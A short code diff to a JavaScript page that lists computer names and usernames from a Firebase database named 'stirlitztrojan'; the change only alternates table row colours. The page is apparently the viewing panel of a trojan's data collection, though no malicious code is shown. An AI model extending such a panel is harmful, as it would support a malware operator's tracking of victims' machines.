@@ -38,6 +38,7 @@
     var firebase = new Firebase("https://stirlitztrojan.firebaseio.com/");
     firebase.once("value", function(snapshot) {
       var rows = snapshot.child("data");
+      var color = "#cccccc";
       rows.forEach(function(row){
         var computer = row.key().split(",")[0].split("&")[0];
         var username = row.key().split(",")[0].split("&")[1];
@@ -47,6 +48,9 @@
         // New row:
         var tableRow = document.getElementById("dataTable").insertRow(1);
         var tableCellComputer = tableRow.insertCell(0);
+        tableRow.style.backgroundColor = color;
+        if(color == "#cccccc") color = "#aaaaaa";
+        else color = "#cccccc";
         tableCellComputer.className = "nowrapword";
         tableCellComputer.innerHTML = computer;
         var tableCellUsername = tableRow.insertCell(1);
